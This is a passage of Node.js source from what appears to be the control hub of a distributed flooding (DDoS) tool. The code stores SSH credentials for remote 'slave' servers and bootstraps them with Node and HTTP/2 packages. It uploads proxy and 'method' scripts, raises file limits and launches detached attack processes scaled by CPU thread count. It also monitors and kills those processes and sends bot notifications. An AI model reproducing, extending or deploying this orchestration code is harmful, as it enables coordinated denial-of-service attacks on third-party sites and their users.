      .concat(hasCRush() ? ['node --check ' + C_RUSH_SCRIPT] : [])
      .concat(hasHttp()  ? ['node --check ' + HTTP_SCRIPT]   : [])
      .join(' && ');
    const r = await exec(conn,
      'cd ' + remoteDir + ' && (' + missingCheck + '); (' + syntaxChecks + ') 2>&1; RC=$?; echo "RC:$RC"; exit $RC', 30000);
    if (r.stdout.includes('__MISSING__')) throw new Error('files missing after upload');
    if (!/RC:0/.test(r.stdout)) throw new Error('syntax: ' + ((r.stderr || r.stdout) || '').slice(-300));
    logAppend(slave, 'verify: OK (' + filesList.length + ' files: ' + filesList.join(', ') + ')');
  }

  async function stageDeps(slave, conn, remoteDir) {
    logAppend(slave, 'deps: hpack colors node-bash-title axios');
    const r = await exec(conn,
      'cd ' + remoteDir + ' && npm install hpack colors node-bash-title axios --no-audit --no-fund --loglevel=error 2>&1 | tail -5; ' +
      'node -e "require(\'hpack\');require(\'colors\');require(\'node-bash-title\');require(\'axios\');console.log(\'__DEPS_OK__\')" 2>&1', 400000);
    if (!r.stdout.includes('__DEPS_OK__')) throw new Error('deps: ' + (r.stdout.slice(-500) || r.stderr.slice(-500)));
    logAppend(slave, 'deps: OK');
  }

  async function stageLimits(slave, conn) {
    const lines = ['* soft nofile 65535', '* hard nofile 65535'];
    for (const l of lines) {
      const already = await exec(conn, 'grep -Fq ' + JSON.stringify(l) + ' /etc/security/limits.conf 2>/dev/null && echo yes || echo no', 10000);
      if (already.stdout.includes('yes')) continue;
      const r = await runPriv(conn, slave, 'echo ' + JSON.stringify(l) + ' >> /etc/security/limits.conf && echo __LIM_OK__', 15000);
      if (!r.stdout.includes('__LIM_OK__'))
        throw new Error('limits append failed: ' + ((r.stderr || r.stdout) || '').slice(-200));
    }
    logAppend(slave, 'limits: OK');
  }

  async function bootstrap(slave) {
    slave.status = 'bootstrapping';
    slave.lastError = null;
    slave.bootstrapStage = 'connect';
    slave.bootstrapStartedAt = Date.now();
    slave._healthFails = 0;
    save();
    logReset(slave);

    // re-log hub files so update flow shows fresh state
    logHubFiles();
    logAppend(slave, 'bootstrap started (v' + VERSION + ')');

    if (!hasScript() || !hasProxy()) {
      slave.status = 'failed';
      slave.lastError = 'Hub missing ' + SCRIPT_NAME + ' or ' + PROXY_NAME;
      slave.bootstrapStage = null;
      delete slave.bootstrapStartedAt;
      save();
      return;
    }
    if (slave.authType === 'key') {
      try { validateKey(slave.privateKey, slave.passphrase); }
      catch (e) {
        slave.status = 'failed'; slave.lastError = 'Key: ' + e.message;
        slave.bootstrapStage = null; delete slave.bootstrapStartedAt; save();
        return;
      }
    }

    let conn;
    try {
      conn = await connectRetry(slave, 60000);
      logAppend(slave, 'connected');

      const info = await stagePreflight(slave, conn);
      slave.cores = info.cores;
      slave.ramMb = info.ramMb;

      slave.bootstrapStage = 'node'; save();
      await stageNode(slave, conn);

      slave.bootstrapStage = 'upload'; save();
      const remoteDir = await stageUpload(slave, conn, info.uid);

      slave.bootstrapStage = 'verify'; save();
      await stageVerify(slave, conn, remoteDir);

      slave.bootstrapStage = 'deps'; save();
      await stageDeps(slave, conn, remoteDir);

      slave.bootstrapStage = 'limits'; save();
      await stageLimits(slave, conn);

      slave.kdir = remoteDir;
      slave.status = 'ready';
      slave.lastCheck = new Date().toISOString();
      slave.lastError = null;
      slave.bootstrapStage = null;
      slave._healthFails = 0;
      delete slave.bootstrapStartedAt;
      save();
      audit('slave_ready', 'system', {
        id: slave.id, cores: info.cores,
        has_c_rush: hasCRush(), has_http: hasHttp(), priv: slave.privMode,
      });
      if (notifyBot) notifyBot({ kind: 'slave_ready', slave: { name: slave.name, ip: slave.ip, cores: info.cores } });
      logAppend(slave, 'READY (' + info.cores + 'c · ' + (info.cores * THREADS_PER_CORE) + ' threads · priv=' + slave.privMode + ')');
    } catch (e) {
      slave.status = 'failed';
      slave.lastError = (slave.bootstrapStage ? '[' + slave.bootstrapStage + '] ' : '') + String(e.message || e).slice(0, 800);
      slave.bootstrapStage = null;
      delete slave.bootstrapStartedAt;
      save();
      audit('slave_failed', 'system', { id: slave.id, error: slave.lastError });
      logAppend(slave, 'FAILED: ' + slave.lastError);
    } finally {
      try { conn && conn.end(); } catch {}
    }
  }

  async function addSlave(input) {
    const slave = {
      id: crypto.randomUUID(),
      name: String(input.name || input.ip || 'slave'),
      ip: String(input.ip).trim(),
      port: Number(input.port) || 22,
      username: String(input.username || 'root').trim(),
      authType: input.authType === 'key' ? 'key' : 'password',
      password:   input.authType === 'key' ? null : String(input.password || ''),
      privateKey: input.authType === 'key' ? String(input.privateKey || '') : null,
      passphrase: input.authType === 'key' && input.passphrase ? String(input.passphrase) : null,
      cores: 0, ramMb: 0, kdir: '',
      status: 'bootstrapping',
      createdAt: new Date().toISOString(),
      lastCheck: null, lastError: null,
      bootstrapStage: 'connect',
      bootstrapStartedAt: Date.now(),
      _healthFails: 0, privMode: null,
    };
    if (slave.authType === 'password' && !slave.password) throw new Error('Password required');
    if (slave.authType === 'key'      && !slave.privateKey) throw new Error('Private key required');
    if (slave.authType === 'key') {
      try { validateKey(slave.privateKey, slave.passphrase); }
      catch (e) { throw new Error('Key invalid: ' + e.message); }
    }
    slaves.push(slave); save();
    audit('slave_added', 'admin', { id: slave.id, ip: slave.ip });
    bootstrap(slave);
    return slave;
  }

  async function removeSlave(id) {
    const i = slaves.findIndex(s => s.id === id);
    if (i < 0) return false;
    slaves.splice(i, 1); save();
    try { fs.unlinkSync(logFile(id)); } catch {}
    audit('slave_removed', 'admin', { id });
    return true;
  }

  async function rebootstrapSlave(id) {
    const slave = slaves.find(s => s.id === id);
    if (!slave) throw new Error('Slave not found');
    if (slave.status === 'bootstrapping') throw new Error('Already bootstrapping');
    logAppend(slave, 're-bootstrap requested');
    bootstrap(slave);
    return slave;
  }

  async function diagnoseAuth(slaveId) {
    const slave = slaves.find(s => s.id === slaveId);
    if (!slave) throw new Error('Slave not found');
    const t0 = Date.now();
    const report = {
      id: slave.id, name: slave.name, ip: slave.ip, port: Number(slave.port) || 22,
      username: slave.username, authType: slave.authType,
      hasPassword: !!slave.password, hasKey: !!slave.privateKey, hasPassphrase: !!slave.passphrase,
      ok: false, banner: '', error: null, elapsedMs: 0, privMode: null, privError: null, nodeVersion: null,
    };
    return new Promise(resolve => {
      const c = new Client();
      let settled = false;
      const fin = err => {
        if (settled) return;
        settled = true;
        report.elapsedMs = Date.now() - t0;
        if (err) report.error = humaniseSshError(String(err.message || err), slave);
        try { c.end(); } catch {}
        resolve(report);
      };
      c.on('banner', b => { report.banner = String(b || '').trim(); });
      c.on('ready', async () => {
        report.ok = true;
        try {
          const priv = await detectPrivilege(c, slave);
          report.privMode = priv.mode;
          if (priv.error) report.privError = priv.error;
          const v = await exec(c, 'node --version 2>/dev/null || /usr/local/bin/node --version 2>/dev/null || echo missing', 10000);
          const vm = (v.stdout || '').match(/v\d+\.\d+\.\d+/);
          report.nodeVersion = vm ? vm[0] : (v.stdout || '').trim();
        } catch (e) { report.privError = String(e.message || e); }
        fin();
      });
      c.on('error', fin);
      const cfg = { host: slave.ip, port: report.port, username: slave.username, readyTimeout: 15000 };
      if (slave.authType === 'key' && slave.privateKey) {
        try { cfg.privateKey = validateKey(slave.privateKey, slave.passphrase); }
        catch (e) { return fin(e); }
        if (slave.passphrase) cfg.passphrase = String(slave.passphrase);
      } else if (slave.password) {
        cfg.password = String(slave.password);
        cfg.tryKeyboard = true;
        c.on('keyboard-interactive', (n, i, l, prompts, finishCb) => {
          try { finishCb(prompts.map(() => String(slave.password))); } catch {}
        });
      } else return fin(new Error('No credentials configured'));
      try { c.connect(cfg); } catch (e) { fin(e); }
      setTimeout(() => fin(new Error('diagnostic timeout')), 20000).unref();
    });
  }

  function shq(s) {
    const str = String(s);
    if (/^[a-zA-Z0-9_@%+=:,.\/-]+$/.test(str)) return str;
    return "'" + str.replace(/'/g, "'\\''") + "'";
  }

  async function launchOnSlave(slaveId, opts) {
    const slave = slaves.find(s => s.id === slaveId);
    if (!slave) throw new Error('Slave not found');
    if (slave.status !== 'ready') throw new Error('Slave ' + slave.name + ' not ready (' + slave.status + ')');
    if (!slave.kdir) throw new Error('Slave directory unknown');
    if (!Number.isInteger(slave.cores) || slave.cores < 1 || slave.cores > MAX_SAFE_CORES)
      throw new Error('Slave ' + slave.name + ' invalid core count (' + slave.cores + ')');

    const methodFile = String(opts.methodFile || SCRIPT_NAME);
    if (!/^[A-Za-z0-9._-]+\.js$/.test(methodFile)) throw new Error('Invalid method file');
    const args = Array.isArray(opts.args) ? opts.args.map(a => String(a)) : null;
    if (!args || !args.length) throw new Error('No launch args');

    const expectedThreads = slave.cores * THREADS_PER_CORE;
    const sid   = 'kold_' + crypto.randomBytes(6).toString('hex');
    const log   = '/tmp/' + sid + '.log';
    const pidF  = '/tmp/' + sid + '.pid';
    const quotedArgs = args.map(shq).join(' ');
    const cmd =
      'cd ' + slave.kdir + ' && { ' +
      'setsid nohup node ' + shq(methodFile) + ' ' + quotedArgs +
      ' </dev/null >' + log + ' 2>&1 & ' +
      'PID=$!; echo $PID > ' + pidF + '; sleep 1; ' +
      'if kill -0 $PID 2>/dev/null; then echo "STARTED:$PID"; else echo "DIED"; cat ' + log + ' | tail -8; fi; ' +
      '}';

    let conn;
    try {
      conn = await connectRetry(slave, 30000);
      const r = await exec(conn, cmd, 45000);
      const m = /STARTED:(\d+)/.exec(r.stdout || '');
      if (!m) throw new Error('launch failed: ' + ((r.stdout || '') + (r.stderr || '')).slice(-500).trim());
      const pid = parseInt(m[1], 10);
      logAppend(slave, 'launched ' + methodFile + ' pid=' + pid);
      return { slaveId, slaveName: slave.name, pid, log, sid, cores: slave.cores, threads: expectedThreads, methodFile };
    } finally { try { conn && conn.end(); } catch {} }
  }

  async function checkProcess(slaveId, pid) {
    const slave = slaves.find(s => s.id === slaveId);
    if (!slave) return { alive: false, reason: 'slave_removed' };
    let conn;
    try {
      conn = await connectOnce(slave, 15000);
      const r = await exec(conn,
        'kill -0 ' + Number(pid) + ' 2>/dev/null && echo ALIVE || ' +
        'kill -0 -' + Number(pid) + ' 2>/dev/null && echo ALIVE_GROUP || echo DEAD', 15000);
      return { alive: /ALIVE/.test(r.stdout || '') };
    } catch (e) { return { alive: false, reason: e.message }; }
    finally { try { conn && conn.end(); } catch {} }
  }

  async function stopProcess(slaveId, pid) {
    const slave = slaves.find(s => s.id === slaveId);
    if (!slave) return false;
    let conn;
    try {
      conn = await connectOnce(slave, 15000);
      await exec(conn, '(kill -9 -' + Number(pid) + ' 2>/dev/null || kill -9 ' + Number(pid) + ' 2>/dev/null); true', 15000);
      return true;
    } catch { return false; }
    finally { try { conn && conn.end(); } catch {} }
  }

  async function healthCheckOne(slave) {
    if (slave.status === 'bootstrapping' || slave.status === 'failed') return false;
    let conn;
    try {
      conn = await connectRetry(slave, 30000);
      // health check also uses live file list so it doesn't flag http.js missing when it wasn't deployed
      const files = [SCRIPT_NAME, PROXY_NAME]
        .concat(hasCRush() ? [C_RUSH_SCRIPT] : [])
        .concat(hasHttp()  ? [HTTP_SCRIPT]   : []);
      const checks = files.map(f => 'test -f ' + f).join(' && ');
      const r = await exec(conn,
        'cd ' + (slave.kdir || '/root/koldvein') + ' && node --version >/dev/null 2>&1 && ' + checks + ' && echo HEALTHY', 20000);
      slave.lastCheck = new Date().toISOString();
      slave._healthFails = 0;
      if (r.stdout.includes('HEALTHY')) { slave.status = 'ready'; slave.lastError = null; }
      else { slave.status = 'unhealthy'; slave.lastError = 'Files missing'; }
    } catch (e) {
      slave.lastCheck = new Date().toISOString();
      slave._healthFails = (slave._healthFails || 0) + 1;
      if (slave._healthFails >= HEALTH_STRIKES)       { slave.status = 'offline';   slave.lastError = String(e.message || '').slice(0, 200); }
      else if (slave._healthFails >= HEALTH_SOFT && slave.status === 'ready')
                                                       { slave.status = 'unhealthy'; slave.lastError = 'Fail ' + slave._healthFails + '×'; }
    } finally { try { conn && conn.end(); } catch {} save(); }
    return slave.status === 'ready';
  }

  async function healthCheckAll() { await Promise.allSettled(slaves.map(healthCheckOne)); }

  function listSlaves() {
    return slaves.map(s => {
      const cores = (Number.isInteger(s.cores) && s.cores >= 1 && s.cores <= MAX_SAFE_CORES) ? s.cores : 0;
      return {
        id: s.id, name: s.name, ip: s.ip, port: s.port, username: s.username,
        cores, ramMb: s.ramMb, status: s.status,
        lastCheck: s.lastCheck, lastError: s.lastError,
        bootstrapStage: s.bootstrapStage || null, authType: s.authType, privMode: s.privMode || null,
        threads: cores * THREADS_PER_CORE,
      };
    });
  }

  const getReadySlaves = () => slaves.filter(s => s.status === 'ready' && Number.isInteger(s.cores) && s.cores >= 1);
  const totalThreads   = () => getReadySlaves().reduce((a, s) => a + s.cores * THREADS_PER_CORE, 0);
  const getById        = id => slaves.find(s => s.id === id);

  return {
    addSlave, removeSlave, rebootstrapSlave,
    listSlaves, getReadySlaves, getById, totalThreads,
    launchOnSlave, checkProcess, stopProcess, healthCheckAll, diagnoseAuth,
    THREADS_PER_CORE, SCRIPT_NAME,
    // expose live getters so hub.js can read them without stale booleans
    get HAS_C_RUSH() { return hasCRush(); },
    get HAS_HTTP()   { return hasHttp();  },
    get C_RUSH_SCRIPT() { return C_RUSH_SCRIPT; },
    get HTTP_SCRIPT()   { return HTTP_SCRIPT;   },
  };
};